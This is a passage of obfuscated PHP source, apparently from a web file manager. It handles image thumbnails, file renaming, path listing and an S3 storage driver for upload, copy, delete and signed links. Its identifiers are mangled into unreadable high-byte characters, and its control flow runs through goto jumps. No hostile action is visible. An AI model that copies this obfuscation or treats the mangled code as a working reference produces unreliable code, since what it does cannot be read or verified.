250) { goto dÌµƒ¨§πã; Eª˜µÖËÈÛ: $dîÇ‡Ç–™å = DATA_THUMB . $A´Øª“ô¥È; if (!@file_exists($dîÇ‡Ç–™å)) { $D∆ÖõÁŸõ = TEMP_FILES; if (!is_dir($D∆ÖõÁŸõ)) { mk_dir($D∆ÖõÁŸõ); } $AûÔΩËê⁄œ = $D∆ÖõÁŸõ . $E√¥Æı£™º . $E‰”ÙéÍ∫ﬂ[91] . $eƒêΩ‹íñÇ[$E‰”ÙéÍ∫ﬂ[156]]; if (!@file_exists($AûÔΩËê⁄œ)) { $AûÔΩËê⁄œ = $this->download($Dø∞«∑≤Î, $AûÔΩËê⁄œ); } $a√âµñÎ‚Ü = new ImageThumb($AûÔΩËê⁄œ, $E‰”ÙéÍ∫ﬂ[163]); $a√âµñÎ‚Ü->prorate($dîÇ‡Ç–™å, $f™«ﬁ©ô∆·, $f™«ﬁ©ô∆· * 10); } if (!file_exists($dîÇ‡Ç–™å) || filesize($dîÇ‡Ç–™å) < 100) { return @file_exists($AûÔΩËê⁄œ) ? IO::fileOut($AûÔΩËê⁄œ) : $this->fileOut($Dø∞«∑≤Î); } goto bêÕÌÏ»¡ã; bêÕÌÏ»¡ã: if (!($a‘™ÑÒƒ”ê = IO::move($dîÇ‡Ç–™å, $bßŸÀú”¥))) { return IO::fileOut($dîÇ‡Ç–™å); } del_file($dîÇ‡Ç–™å); IO::fileOut($a‘™ÑÒƒ”ê); goto dÜ◊ﬂáı‡·; dÌµƒ¨§πã: $E‰”ÙéÍ∫ﬂ =& $_SERVER[¯èãÄπµ]; if (substr($Dø∞«∑≤Î, 0, 4) == $E‰”ÙéÍ∫ﬂ[142]) { $this->fileOutLink($Dø∞«∑≤Î); } $eƒêΩ‹íñÇ = $this->info($Dø∞«∑≤Î); goto cªÀÑÈç·ù; cªÀÑÈç·ù: if ($eƒêΩ‹íñÇ[$E‰”ÙéÍ∫ﬂ[77]] <= 1024 * 50 || !function_exists($E‰”ÙéÍ∫ﬂ[155]) || $eƒêΩ‹íñÇ[$E‰”ÙéÍ∫ﬂ[156]] == $E‰”ÙéÍ∫ﬂ[157]) { return $this->fileOut($Dø∞«∑≤Î); } if (isset($eƒêΩ‹íñÇ[$E‰”ÙéÍ∫ﬂ[158]][$E‰”ÙéÍ∫ﬂ[159]])) { $E√¥Æı£™º = $eƒêΩ‹íñÇ[$E‰”ÙéÍ∫ﬂ[158]][$E‰”ÙéÍ∫ﬂ[159]]; } else { if (isset($eƒêΩ‹íñÇ[$E‰”ÙéÍ∫ﬂ[158]][$E‰”ÙéÍ∫ﬂ[160]])) { $E√¥Æı£™º = $eƒêΩ‹íñÇ[$E‰”ÙéÍ∫ﬂ[158]][$E‰”ÙéÍ∫ﬂ[160]]; } else { $E√¥Æı£™º = md5("{$eƒêΩ‹íñÇ[$E‰”ÙéÍ∫ﬂ[28]]}\x5f{$eƒêΩ‹íñÇ[$E‰”ÙéÍ∫ﬂ[75]]}\x5f{$eƒêΩ‹íñÇ[$E‰”ÙéÍ∫ﬂ[77]]}"); } } $A´Øª“ô¥È = "{$E√¥Æı£™º}\137{$f™«ﬁ©ô∆·}\x2e\160\x6e\147"; goto A¯ÖÌò±÷Ç; A¯ÖÌò±÷Ç: if (!($eË∂Ùò∂˘¢ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $E‰”ÙéÍ∫ﬂ[161]))) { $bßŸÀú”¥ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $E‰”ÙéÍ∫ﬂ[162]); } else { $bßŸÀú”¥ = KodIO::make($eË∂Ùò∂˘¢); } if ($eË∂Ùò∂˘¢ = IO::fileNameExist($bßŸÀú”¥, $A´Øª“ô¥È)) { $dîÇ‡Ç–™å = KodIO::make($eË∂Ùò∂˘¢); return IO::fileOut($dîÇ‡Ç–™å); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto Eª˜µÖËÈÛ; dÜ◊ﬂáı‡·: } public function fileOutImageServer($E∏˜ù≤€Àæ, $C¥é•ÿöÉΩ = 250) { $this->fileOutImage($E∏˜ù≤€Àæ, $C¥é•ÿöÉΩ); } public function fileNameAuto($C’´„Ï·ï„, $dÔÕö«±ÜÛ, $A˜©π—Üºé = REPEAT_RENAME, $dúÊëèÂº∞ = false) { goto Dá≈‡˜ıî·; aŒç¯êıÔé: $C˘êËç÷≠ù = 1; $BäÍê∆Ëò´ = substr($dÔÕö«±ÜÛ, 0, strlen($dÔÕö«±ÜÛ) - strlen($Fá»Âﬂ∫’Ó)); $aüõ∆ç¢„· = $BäÍê∆Ëò´ . "\50{$C˘êËç÷≠ù}\51{$Fá»Âﬂ∫’Ó}"; goto e… ÑîÁ”â; Dá≈‡˜ıî·: $b‚¢À∂œ≥≈ =& $_SERVER[¯èãÄπµ]; $d¿¶¿‘∆„¡ = $C’´„Ï·ï„ === $b‚¢À∂œ≥≈[33] ? $dÔÕö«±ÜÛ : rtrim($C’´„Ï·ï„, $b‚¢À∂œ≥≈[8]) . $b‚¢À∂œ≥≈[8] . $dÔÕö«±ÜÛ; if ($A˜©π—Üºé == REPEAT_REPLACE || !$this->exist($d¿¶¿‘∆„¡) || $dúÊëèÂº∞ && $A˜©π—Üºé != REPEAT_RENAME_FOLDER) { return $dÔÕö«±ÜÛ; } goto F∆‘‹≤Ñ‘≤; e… ÑîÁ”â: while ($this->exist(rtrim($C’´„Ï·ï„, $b‚¢À∂œ≥≈[8]) . $b‚¢À∂œ≥≈[8] . $aüõ∆ç¢„·)) { $aüõ∆ç¢„· = $BäÍê∆Ëò´ . "\50{$C˘êËç÷≠ù}\51{$Fá»Âﬂ∫’Ó}"; $C˘êËç÷≠ù++; } return $aüõ∆ç¢„·; goto FŸ…œØéÜ⁄; F∆‘‹≤Ñ‘≤: if ($A˜©π—Üºé == REPEAT_SKIP) { return !1; } $Fá»Âﬂ∫’Ó = $b‚¢À∂œ≥≈[91] . get_path_ext($dÔÕö«±ÜÛ); $Fá»Âﬂ∫’Ó = $Fá»Âﬂ∫’Ó == $b‚¢À∂œ≥≈[91] || $dúÊëèÂº∞ ? $b‚¢À∂œ≥≈[33] : $Fá»Âﬂ∫’Ó; goto aŒç¯êıÔé; FŸ…œØéÜ⁄: } public function listAllFiles($B•áÙ™˘à¡, $a‡¶ë‡≥∂å, $bòïﬂÕ’Íœ = array()) { goto Eö”™”Ö™Ê; a’Ü’≤ﬁÜÓ: foreach (array_unique($EØÇôáî‰î) as $F öÕâßë≠) { $dÓ—É¥íË≠ = array($D€åÈë±Ü˘[75] => $this->getPathOuter($D€åÈë±Ü˘[8] . $B•áÙ™˘à¡ . $D€åÈë±Ü˘[8] . $F öÕâßë≠), $D€åÈë±Ü˘[76] => 1, $D€åÈë±Ü˘[77] => 0); if (substr($F öÕâßë≠, -1) != $D€åÈë±Ü˘[8]) { $dÓ—É¥íË≠[$D€åÈë±Ü˘[76]] = 0; $Eûô∞ì„ˆù = $this->getPath($B•áÙ™˘à¡ . $D€åÈë±Ü˘[8] . $F öÕâßë≠); $dÓ—É¥íË≠[$D€åÈë±Ü˘[77]] = isset($bòïﬂÕ’Íœ[$Eûô∞ì„ˆù]) ? $bòïﬂÕ’Íœ[$Eûô∞ì„ˆù] : $this->size($Eûô∞ì„ˆù); } $bﬂπ¯äì«©[] = $dÓ—É¥íË≠; } return $bﬂπ¯äì«©; goto FÒΩêÿÌè ; dáÎı°ˆÊ—: $B•áÙ™˘à¡ = trim($B•áÙ™˘à¡, $D€åÈë±Ü˘[8]); foreach ($a‡¶ë‡≥∂å as $F öÕâßë≠) { $b“ıµ≈úœˆ = ltrim(substr($F öÕâßë≠, strlen($B•áÙ™˘à¡)), $D€åÈë±Ü˘[8]); $EØÇôáî‰î = array_merge($EØÇôáî‰î, $this->slicePath($b“ıµ≈úœˆ)); } $bﬂπ¯äì«© = array(); goto a’Ü’≤ﬁÜÓ; Eö”™”Ö™Ê: $D€åÈë±Ü˘ =& $_SERVER[¯èãÄπµ]; if (empty($a‡¶ë‡≥∂å)) { return array(); } $EØÇôáî‰î = array(); goto dáÎı°ˆÊ—; FÒΩêÿÌè : } public function slicePath($Aıùä≤⁄ñ√) { $D™œ«æãâ£ =& $_SERVER[¯èãÄπµ]; $eÜøüü¿»ÿ = explode($D™œ«æãâ£[8], trim($Aıùä≤⁄ñ√, $D™œ«æãâ£[8])); $D—∏Â∂±ò√ = 0; do { ++$D—∏Â∂±ò√; $eÏ‚öˆÖƒ◊[] = implode($D™œ«æãâ£[8], array_slice($eÜøüü¿»ÿ, 0, $D—∏Â∂±ò√)) . $D™œ«æãâ£[8]; } while ($D—∏Â∂±ò√ < count($eÜøüü¿»ÿ)); $eÏ‚öˆÖƒ◊[count($eÜøüü¿»ÿ) - 1] = $Aıùä≤⁄ñ√; return $eÏ‚öˆÖƒ◊; } public function getHost() { $bøÜ ø¬«Ñ =& $_SERVER[¯èãÄπµ]; $E•Ú¡∑‘ºõ = parse_url(trim($this->domain, $bøÜ ø¬«Ñ[8])); $Cÿ’Ò€ÿËÏ = isset($E•Ú¡∑‘ºõ[$bøÜ ø¬«Ñ[164]]) ? $E•Ú¡∑‘ºõ[$bøÜ ø¬«Ñ[164]] : http_type(); $e∆‰öπ∞Êﬁ = isset($E•Ú¡∑‘ºõ[$bøÜ ø¬«Ñ[165]]) ? $E•Ú¡∑‘ºõ[$bøÜ ø¬«Ñ[165]] : $E•Ú¡∑‘ºõ[$bøÜ ø¬«Ñ[75]]; if (isset($E•Ú¡∑‘ºõ[$bøÜ ø¬«Ñ[166]])) { $e∆‰öπ∞Êﬁ .= $bøÜ ø¬«Ñ[4] . $E•Ú¡∑‘ºõ[$bøÜ ø¬«Ñ[166]]; } return $Cÿ’Ò€ÿËÏ . $bøÜ ø¬«Ñ[167] . $e∆‰öπ∞Êﬁ; } public function pathEncode($c®¡ã„À∑ç) { $F¡ª“ÎØà÷ =& $_SERVER[¯èãÄπµ]; return str_replace($F¡ª“ÎØà÷[168], $F¡ª“ÎØà÷[8], rawurlencode($c®¡ã„À∑ç)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($Fñæù®õÃû) { set_timeout(); require_once SDK_DIR . $_SERVER[¯èãÄπµ][169]; parent::__construct(); $this->_init($Fñæù®õÃû); } public function _init($CΩ‹èë’‹Ú) { foreach ($CΩ‹èë’‹Ú as $D“øëà©‚∞ => $A«–Îä˜Ïß) { if (isset($this->{$D“øëà©‚∞})) { $this->{$D“øëà©‚∞} = $A«–Îä˜Ïß; } } $this->endpoint = $CΩ‹èë’‹Ú[$_SERVER[¯èãÄπµ][170]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($dåîÜÖÂ≈π = "\166\64") { $this->signVer = $dåîÜÖÂ≈π; $this->client->setSignatureVersion($dåîÜÖÂ≈π); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto A„ÑÕ≈ë˜ù; A„ÑÕ≈ë˜ù: $DÈ˜µí†ßå =& $_SERVER[¯èãÄπµ]; $eÏÖ‰ô„øÙ = $this->getBucketCors(); if (!$eÏÖ‰ô„øÙ || !is_array($eÏÖ‰ô„øÙ)) { return !1; } goto b€Ãøﬂº’ï; c€≥ã∑Üã‡: $bÃõñŒäıÀ = array($DÈ˜µí†ßå[176], $DÈ˜µí†ßå[177], $DÈ˜µí†ßå[178], $DÈ˜µí†ßå[179], $DÈ˜µí†ßå[180]); $F‘œ◊áúÚƒ = array_diff($bÃõñŒäıÀ, $dí•≈˜Ω•Ø); return empty($F‘œ◊áúÚƒ); goto Dê’Íçƒ’°; b€Ãøﬂº’ï: if ($eÏÖ‰ô„øÙ[$DÈ˜µí†ßå[171]] != $DÈ˜µí†ßå[172] || $eÏÖ‰ô„øÙ[$DÈ˜µí†ßå[173]] != $DÈ˜µí†ßå[172]) { return !1; } $dí•≈˜Ω•Ø = array_map($DÈ˜µí†ßå[174], $eÏÖ‰ô„øÙ[$DÈ˜µí†ßå[175]]); if (!is_array($dí•≈˜Ω•Ø)) { $dí•≈˜Ω•Ø = array(); } goto c€≥ã∑Üã‡; Dê’Íçƒ’°: } public function mkfile($cà‡ÿ‰Ÿ¨È, $d‰√∆ë¶ıÛ = '', $cèå◊¨„ƒ = REPEAT_RENAME) { $BÛ·÷˘Áä¯ = $this->setContent($cà‡ÿ‰Ÿ¨È, $d‰√∆ë¶ıÛ); if ($BÛ·÷˘Áä¯ !== !1) { return $this->getPathOuter($cà‡ÿ‰Ÿ¨È); } return !1; } public function mkdir($aÕ¨œ±øªØ, $FóÌÜòÑÉâ = REPEAT_SKIP) { if (empty($aÕ¨œ±øªØ)) { return !1; } if ($this->_isFolder($aÕ¨œ±øªØ)) { return $this->getPathOuter($aÕ¨œ±øªØ); } $b«âΩ¿éºç = $this->setContent($aÕ¨œ±øªØ, $_SERVER[¯èãÄπµ][33], !0); if ($b«âΩ¿éºç !== !1) { return $this->getPathOuter($aÕ¨œ±øªØ); } return !1; } public function copyFile($cÜùéÑ–òå, $eäÒöœúÛ≥, $FâÊÆó®å§ = array()) { $a¿ñ›ƒØ°Ó =& $_SERVER[¯èãÄπµ]; $b‰ìüÓ∂◊€ = $this->objectMeta($cÜùéÑ–òå); if (!$b‰ìüÓ∂◊€) { return !1; } if ($b‰ìüÓ∂◊€[$a¿ñ›ƒØ°Ó[77]] <= 1024 * 1024 * 200) { $b≠ª¿¯Ü°Á = $this->client->copyObject($this->bucket, $cÜùéÑ–òå, $this->bucket, $eäÒöœúÛ≥, $a¿ñ›ƒØ°Ó[181], $FâÊÆó®å§); } else { $b≠ª¿¯Ü°Á = $this->client->multiCopyObject($this->bucket, $cÜùéÑ–òå, $this->bucket, $eäÒöœúÛ≥, $FâÊÆó®å§); } $b≠ª¿¯Ü°Á = $b≠ª¿¯Ü°Á ? $this->getPathOuter($eäÒöœúÛ≥) : !1; return $b≠ª¿¯Ü°Á; } public function moveFile($B£Ω◊»¢Áß, $A…°ÍñÉò§) { if ($this->copyFile($B£Ω◊»¢Áß, $A…°ÍñÉò§)) { $this->delFile($B£Ω◊»¢Áß); return $this->getPathOuter($A…°ÍñÉò§); } return !1; } public function delFile($C™ΩΩè¿Ç ) { return $this->client->deleteObject($this->bucket, $C™ΩΩè¿Ç ); } public function delFolder($Bîö∆êàôü) { goto C£œïçÑ‹∂; cÜ°·„Ï§ø: return $CÂØ‡è˘¨ˆ === $FóÏ≈≈ö´“ ? !0 : !1; goto f√Êè¥ ∂û; C£œïçÑ‹∂: $fÏ±∆≈ù°È =& $_SERVER[¯èãÄπµ]; $dı´≥Ü‚¯ë = $this->listObjs($Bîö∆êàôü); if (!$dı´≥Ü‚¯ë) { $Bîö∆êàôü = trim($Bîö∆êàôü, $fÏ±∆≈ù°È[8]); if (!empty($Bîö∆êàôü)) { $Bîö∆êàôü .= $fÏ±∆≈ù°È[8]; } return $this->delFile($Bîö∆êàôü); } goto cØ˘¬Ÿ§¢¬; cØ˘¬Ÿ§¢¬: $CÂØ‡è˘¨ˆ = $FóÏ≈≈ö´“ = 0; $d∫ûπ˜øÿΩ = array_chunk(array_keys($dı´≥Ü‚¯ë), 1000); foreach ($d∫ûπ˜øÿΩ as $BôÏ∑º≤¨Ü) { $CÂØ‡è˘¨ˆ++; $FóÏ≈≈ö´“ += (int) $this->client->deleteObjects($this->bucket, $BôÏ∑º≤¨Ü); } goto cÜ°·„Ï§ø; f√Êè¥ ∂û: } public function rename($Aóº≠’≠ç, $Cƒ¨‹ÏﬂÑê) { return $this->renameObject($Aóº≠’≠ç, $Cƒ¨‹ÏﬂÑê); } public function listPath($c… ÃµÚŒ›, $dˆûÎ´Œ“ú = false) { $a«⁄”Ω¡Öä =& $_SERVER[¯èãÄπµ]; $B÷Éê©ÚÂ· = $this->listObjs($c… ÃµÚŒ›, null, null, $a«⁄”Ω¡Öä[8]); $eÒªèû¨ﬁØ = array($a«⁄”Ω¡Öä[74] => array(), $a«⁄”Ω¡Öä[73] => array()); foreach ($B÷Éê©ÚÂ· as $dèïâ¬›ﬂ• => $E„”›“ì€‘) { if ($dèïâ¬›ﬂ• == $a«⁄”Ω¡Öä[8]) { continue; } if (isset($E„”›“ì€‘[$a«⁄”Ω¡Öä[182]])) { $eÒªèû¨ﬁØ[$a«⁄”Ω¡Öä[74]][] = $this->folderInfo($E„”›“ì€‘[$a«⁄”Ω¡Öä[182]], $dˆûÎ´Œ“ú); } else { if (substr($E„”›“ì€‘[$a«⁄”Ω¡Öä[28]], -1) == $a«⁄”Ω¡Öä[8]) { continue; } $eÒªèû¨ﬁØ[$a«⁄”Ω¡Öä[73]][] = $this->fileInfo($E„”›“ì€‘[$a«⁄”Ω¡Öä[28]], $dˆûÎ´Œ“ú, $E„”›“ì€‘); } } return $eÒªèû¨ﬁØ; } private function fileInfo($b™ë“∆ﬁ±ì, $B”¡º¢¯Ë† = false, $a¢ï§‘—µ† = array()) { goto Aìüããˆßó; c—ëï Çá∑: return $D áîÍÛ™÷; goto Eƒ’ÒâÉπı; b°” ˘ﬁ„“: if (empty($a¢ï§‘—µ†)) { $a¢ï§‘—µ† = $this->objectMeta($b™ë“∆ﬁ±ì); if (!$a¢ï§‘—µ†) { return $D áîÍÛ™÷; } } if (isset($a¢ï§‘—µ†[$Dïâ·Ñı¶—[186]])) { $D áîÍÛ™÷[$Dïâ·Ñı¶—[106]] = $a¢ï§‘—µ†[$Dïâ·Ñı¶—[186]]; } if (isset($a¢ï§‘—µ†[$Dïâ·Ñı¶—[77]])) { $D áîÍÛ™÷[$Dïâ·Ñı¶—[77]] = $a¢ï§‘—µ†[$Dïâ·Ñı¶—[77]]; } goto c—ëï Çá∑; Aìüããˆßó: $Dïâ·Ñı¶— =& $_SERVER[¯èãÄπµ]; if ($B”¡º¢¯Ë†) { return array($Dïâ·Ñı¶—[28] => $this->pathThis($b™ë“∆ﬁ±ì), $Dïâ·Ñı¶—[75] => $this->getPathOuter($b™ë“∆ﬁ±ì), $Dïâ·Ñı¶—[29] => $Dïâ·Ñı¶—[163], $Dïâ·Ñı¶—[156] => $this->ext($b™ë“∆ﬁ±ì), $Dïâ·Ñı¶—[77] => isset($a¢ï§‘—µ†[$Dïâ·Ñı¶—[77]]) ? $a¢ï§‘—µ†[$Dïâ·Ñı¶—[77]] : 0, $Dïâ·Ñı¶—[183] => 0, $Dïâ·Ñı¶—[106] => 0, $Dïâ·Ñı¶—[184] => !0, $Dïâ·Ñı¶—[185] => !0); } $D áîÍÛ™÷ = array($Dïâ·Ñı¶—[28] => $this->pathThis($b™ë“∆ﬁ±ì), $Dïâ·Ñı¶—[75] => $this->getPathOuter($b™ë“∆ﬁ±ì), $Dïâ·Ñı¶—[29] => $Dïâ·Ñı¶—[163], $Dïâ·Ñı¶—[183] => 0, $Dïâ·Ñı¶—[106] => 0, $Dïâ·Ñı¶—[77] => 0, $Dïâ·Ñı¶—[156] => $this->ext($b™ë“∆ﬁ±ì), $Dïâ·Ñı¶—[184] => !0, $Dïâ·Ñı¶—[185] => !0); goto b°” ˘ﬁ„“; Eƒ’ÒâÉπı: } private function folderInfo($b‚Î∂‘„ë–, $E™ı€óé…“ = false) { goto bÊíºà°ˆØ; bÊíºà°ˆØ: $bÓœÇ◊úŒı =& $_SERVER[¯èãÄπµ]; if ($E™ı€óé…“) { return array($bÓœÇ◊úŒı[28] => $this->pathThis($b‚Î∂‘„ë–), $bÓœÇ◊úŒı[75] => $this->getPathOuter($bÓœÇ◊úŒı[8] . $b‚Î∂‘„ë–), $bÓœÇ◊úŒı[29] => $bÓœÇ◊úŒı[76], $bÓœÇ◊úŒı[184] => !0, $bÓœÇ◊úŒı[185] => !0); } $Aƒ¶Ñπå¡√ = array($bÓœÇ◊úŒı[28] => $this->pathThis($b‚Î∂‘„ë–), $bÓœÇ◊úŒı[75] => $this->getPathOuter($bÓœÇ◊úŒı[8] . $b‚Î∂‘„ë–), $bÓœÇ◊úŒı[29] => $bÓœÇ◊úŒı[76], $bÓœÇ◊úŒı[183] => 0, $bÓœÇ◊úŒı[106] => 0, $bÓœÇ◊úŒı[184] => !0, $bÓœÇ◊úŒı[185] => !0); goto a‚‹èËŸß«; BöÜá¶¨µÈ: if (isset($c√–ÓÓûÊ«[$bÓœÇ◊úŒı[186]])) { $Aƒ¶Ñπå¡√[$bÓœÇ◊úŒı[183]] = $c√–ÓÓûÊ«[$bÓœÇ◊úŒı[186]]; } return $Aƒ¶Ñπå¡√; goto DõŸÀœè˜Ü; a‚‹èËŸß«: if ($b‚Î∂‘„ë– == $bÓœÇ◊úŒı[33]) { return $Aƒ¶Ñπå¡√; } $b‚Î∂‘„ë– = trim($b‚Î∂‘„ë–, $bÓœÇ◊úŒı[8]) . $bÓœÇ◊úŒı[8]; $c√–ÓÓûÊ« = $this->objectMeta($b‚Î∂‘„ë–); goto BöÜá¶¨µÈ; DõŸÀœè˜Ü: } public function listObjs($d–™≠á£Ù˜, $bà™ıé∂åµ = null, $e∞áæœô™Ÿ = null, $D∂œêåâÉñ = null) { $e≠˜§ô·¿¡ =& $_SERVER[¯èãÄπµ]; $d–™≠á£Ù˜ = trim($d–™≠á£Ù˜, $e≠˜§ô·¿¡[8]); $eÌèÃ“ˆÃ— = empty($d–™≠á£Ù˜) ? $e≠˜§ô·¿¡[33] : $d–™≠á£Ù˜ . $e≠˜§ô·¿¡[8]; return $this->client->getBucket($this->bucket, $eÌèÃ“ˆÃ—, $bà™ıé∂åµ, $e∞áæœô™Ÿ, $D∂œêåâÉñ, !0); } public function has($bìÑ÷àŒıë, $BÇ∏ë≈“óê = false, $bÙ‚Œ€◊Ï‰ = true) { goto B•†§⁄ÉÎ∆; C‰‘ñ«ì»„: if ($BÇ∏ë≈“óê) { return array($DèèõÛ…“À[187] => $Eπ¢öáöΩ√, $DèèõÛ…“À[188] => $D»Ç®êãæø); } return !1; goto Eà∫î„éñ¨; B•†§⁄ÉÎ∆: $DèèõÛ…“À =& $_SERVER[¯èãÄπµ]; $Eπ¢öáöΩ√ = 0; $D»Ç®êãæø = 0; goto f°Ï’ûçõÇ; f°Ï’ûçõÇ: $d™µﬂ™§©Ú = $this->listObjs($bìÑ÷àŒıë, null, null, $DèèõÛ…“À[8]); $d™µﬂ™§©Ú = is_array($d™µﬂ™§©Ú) ? $d™µﬂ™§©Ú : array(); foreach ($d™µﬂ™§©Ú as $Bàíå≥≥ªî) { if (isset($Bàíå≥≥ªî[$DèèõÛ…“À[28]]) && substr($Bàíå≥≥ªî[$DèèõÛ…“À[28]], -1) != $DèèõÛ…“À[8]) { if (!$BÇ∏ë≈“óê && $bÙ‚Œ€◊Ï‰) { return !0; } $Eπ¢öáöΩ√++; } else { if (isset($Bàíå≥≥ªî[$DèèõÛ…“À[182]])) { if (!$BÇ∏ë≈“óê && !$bÙ‚Œ€◊Ï‰) { return !1; } $D»Ç®êãæø++; } } } goto C‰‘ñ«ì»„; Eà∫î„éñ¨: } public function listAll($Dùìÿõâß¬) { $DÔíáéÆâ– =& $_SERVER[¯èãÄπµ]; $f¬ñâã””– = $this->listObjs($Dùìÿõâß¬); $f∑Ó…™ô⁄Á = $f°¶Úª±âå = array(); foreach ($f¬ñâã””– as $açõœÁ…≠˜ => $DÁ≥Ñ…§ÿ£) { $f∑Ó…™ô⁄Á[] = $DÁ≥Ñ…§ÿ£[$DÔíáéÆâ–[28]]; $f°¶Úª±âå[$açõœÁ…≠˜] = $DÁ≥Ñ…§ÿ£[$DÔíáéÆâ–[77]]; } return $this->listAllFiles($Dùìÿõâß¬, $f∑Ó…™ô⁄Á, $f°¶Úª±âå); } public function canRead($cëÃΩ‘ÂÍŸ) { $b÷ÊŒ—ﬁÂÏ =& $_SERVER[¯èãÄπµ]; $d…∏ÍÜÙπ£ = $this->client->getAccessControlPolicy($this->bucket, $cëÃΩ‘ÂÍŸ); if (!$d…∏ÍÜÙπ£) { return !1; } return in_array($d…∏ÍÜÙπ£, array($b÷ÊŒ—ﬁÂÏ[189], $b÷ÊŒ—ﬁÂÏ[190], $b÷ÊŒ—ﬁÂÏ[191])) ? !0 : !1; } public function canWrite($f±∂ÈåÓ·Ø) { $AáﬂÏø®©Ú =& $_SERVER[¯èãÄπµ]; $EÖê∞ÉŸ≤ê = $this->client->getAccessControlPolicy($this->bucket, $f±∂ÈåÓ·Ø); if (!$EÖê∞ÉŸ≤ê) { return !1; } return in_array($EÖê∞ÉŸ≤ê, array($AáﬂÏø®©Ú[189], $AáﬂÏø®©Ú[190])) ? !0 : !1; } public function getContent($D≠¶„ûúèù) { return $this->client->getObject($this->bucket, $D≠¶„ûúèù); } public function setContent($DÏìΩ‚≤≠±, $e´Û‰£ Ìæ = '', $EÚúúÔ®òÚ = false) { goto eö«—Çœåà; Aäé¶Ø‚∑ƒ: $F∫±ø¡¬î∆ = $this->client->putObject($e´Û‰£ Ìæ, $this->bucket, $DÏìΩ‚≤≠±, $c·‹¢òıÃı[181], array(), $AÑú◊Œä æ); if (!$F∫±ø¡¬î∆) { return !1; } if ($EÚúúÔ®òÚ) { return !0; } goto cÀ˜Ë«ë¬; eö«—Çœåà: $c·‹¢òıÃı =& $_SERVER[¯èãÄπµ]; $DÏìΩ‚≤≠± = $EÚúúÔ®òÚ ? trim($DÏìΩ‚≤≠±, $c·‹¢òıÃı[8]) . $c·‹¢òıÃı[8] : $DÏìΩ‚≤≠±; $AÑú◊Œä æ = get_file_mime(get_path_ext($DÏìΩ‚≤≠±)); goto Aäé¶Ø‚∑ƒ; cÀ˜Ë«ë¬: $F∫±ø¡¬î∆ = $this->copyFile($DÏìΩ‚≤≠±, $DÏìΩ‚≤≠±, array($c·‹¢òıÃı[192] => $F∫±ø¡¬î∆[$c·‹¢òıÃı[193]])); return $F∫±ø¡¬î∆ ? !0 : !1; goto BÂ»œ‘À∫É; BÂ»œ‘À∫É: } public function fileSubstr($Bíëüˆà»ü, $EŒù±õõÕâ, $DÔ—⁄ûÒõﬂ) { $fÁ–ë”ı™… = $EŒù±õõÕâ + $DÔ—⁄ûÒõﬂ - 1; return $this->client->getObject($this->bucket, $Bíëüˆà»ü, array($_SERVER[¯èãÄπµ][194] => "\142\x79\164\x65\163\x3d{$EŒù±õõÕâ}\x2d{$fÁ–ë”ı™…}")); } public function upload($Fû‹çëíå¡, $A≈’‹°£‰Ë, $E∫«é± ∫è = false, $dï≤æıèôª = REPEAT_REPLACE) { $D˜¥Ê §„Ô =& $_SERVER[¯èãÄπµ]; $dΩöéî√°Œ = array($D˜¥Ê §„Ô[192] => @md5_file($A≈’‹°£‰Ë)); $d≥è•îá¡Ì = array($D˜¥Ê §„Ô[195] => get_file_mime(get_path_ext($Fû‹çëíå¡))); if (IO::size($A≈’‹°£‰Ë) <= 1024 * 1024 * 200) { $EÕ√òê®€≥ = $this->client->putObjectFile($A≈’‹°£‰Ë, $this->bucket, $Fû‹çëíå¡, $D˜¥Ê §„Ô[181], $dΩöéî√°Œ, $d≥è•îá¡Ì); return !empty($EÕ√òê®€≥) ? $this->getPathOuter($Fû‹çëíå¡) : !1; } $fœ¿˘§¥ÕÉ = $this->client->multiUploadObject($A≈’‹°£‰Ë, $this->bucket, trim($Fû‹çëíå¡, $D˜¥Ê §„Ô[8]), $dΩöéî√°Œ, $d≥è•îá¡Ì); return $fœ¿˘§¥ÕÉ ? $this->getPathOuter($Fû‹çëíå¡) : !1; } public function download($cÆ™Íü∆ø©, $F◊÷˘ﬁÛ⁄œ) { if (!@is_dir($this->pathFather($F◊÷˘ﬁÛ⁄œ)) && !IO::mkdir($this->pathFather($F◊÷˘ﬁÛ⁄œ))) { return !1; } $A◊êÜà¬∫å = $this->client->getObject($this->bucket, $cÆ™Íü∆ø©, array(), $F◊÷˘ﬁÛ⁄œ); return $A◊êÜà¬∫å !== !1 ? $F◊÷˘ﬁÛ⁄œ : !1; } public function link($eËªóà¯ÇÂ, $D”Öê“ÈÕñ = array()) { $A™™¡üË—” =& $_SERVER[¯èãÄπµ]; if ($this->signVer == $A™™¡üË—”[196]) { return $this->client->getAuthenticatedURL($this->bucket, $eËªóà¯ÇÂ, 3600 * 12, $D”Öê“ÈÕñ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($eËªóà¯ÇÂ, $A™™¡üË—”[8]), 3600 * 12, $this->region, array(), !0, $D”Öê“ÈÕñ); } public function fileOut($eî ìÑê«ƒ, $C–ÜÌ¬Ùêä = false, $fçá¶¬ä†ì = false, $EÀÔÖÉ≥ÑÈ = '') { goto eãÑ¨õ¡§π; eãÑ¨õ¡§π: $fµã•Çúã« =& $_SERVER[¯èãÄπµ]; if (!$fçá¶¬ä†ì) { $fçá¶¬ä†ì = $this->pathThis($eî ìÑê«ƒ); } $C∆Ç™∂Ô∫ô = get_file_mime(get_path_ext($fçá¶¬ä†ì)); goto C¯Ü°æÉ∏º; C¯Ü°æÉ∏º: if ($C∆Ç™∂Ô∫ô == $fµã•Çúã«[197]) { return parent::fileOut($eî ìÑê«ƒ, $C–ÜÌ¬Ùêä, $fçá¶¬ä†ì, $EÀÔÖÉ≥ÑÈ); } $C–ÜÌ¬Ùêä = $C–ÜÌ¬Ùêä ? $fµã•Çúã«[198] : $fµã•Çúã«[199]; $Dü…“≈“§‚ = array($fµã•Çúã«[200] => $C–ÜÌ¬Ùêä . $fµã•Çúã«[201] . 